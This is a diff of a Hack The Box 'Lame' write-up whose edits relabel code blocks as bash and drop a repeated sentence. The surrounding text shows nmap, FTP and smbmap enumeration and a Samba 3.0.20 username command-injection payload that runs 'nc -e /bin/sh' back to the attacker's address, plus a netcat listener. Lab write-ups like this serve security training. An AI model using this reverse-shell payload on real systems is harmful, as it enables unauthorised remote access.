@@ -11,8 +11,6 @@ mermaid: true
 
 ![](/assets/images/writeups/Lame-HTB/banner.png)
 
-This writeup is based on Lame on Hack the box.
-
 ## TL:DR
 
 This writeup is based on [__Lame__](https://app.hackthebox.com/machines/Lame) on Hack the box. It was a Linux box. It starts with two
@@ -27,7 +25,7 @@ I started with a Nmap scan, I found ports 21, 22, 139, and 445 as FTP, SSH, NetB
 and Microsoft-ds respectively. I got FTP login allowed via anonymous user and Samba service. 
 By Nmap’s banner grabbing, we got the Samba version that is 3.0.20. Let’s see the Nmap result.
 
-```javascript
+```bash
  Command - nmap -sV -A <ip address>
 ```
 
@@ -82,7 +80,7 @@ next phase.
 
 In the enumeration phase, we will first enumerate the FTP via anonymous user.
 
-```javascript
+```bash
  Command - ftp 10.129.127.33
 ```
 
@@ -114,7 +112,7 @@ we can try to exploit it in the exploitation phase. Now, let’s move to Samba s
 
 Here, we can enumerate Samba using [__smbmap__](https://www.kali.org/tools/smbmap/) to get more information about the machine.
 
-```javascript
+```bash
  Command - smbmap -H 10.129.127.33
 ```
 
@@ -131,7 +129,7 @@ Here, we can enumerate Samba using [__smbmap__](https://www.kali.org/tools/smbma
 We get to know that the samba service provides read and write access to tmp directory. 
 Now, we can do a recursive scan to identify more information about it.
 
-```javascript
+```bash
  Command - smbmap -H 10.129.127.33 -R
 ```
 
@@ -245,7 +243,7 @@ includes nohup(which is used to end the shell after a long time) and we put the 
 (nc) along with our local IP address and port, and then /bin/sh, which provides a shell on the
 system. we can also use /bin/bash as its another common shell present on linux.
 
-```javascript
+```bash
  Payload for username - logon "/=nohup nc -nv 10.10.14.3 4444 -e /bin/sh"
 ```
 
@@ -261,7 +259,7 @@ system. we can also use /bin/bash as its another common shell present on linux.
 Now, we have to open listener using Netcat on another terminal to get back the system shell of
 the machine.
 
-```javascript
+```bash
  Command - nc -lvnp 4444 
 ```
 
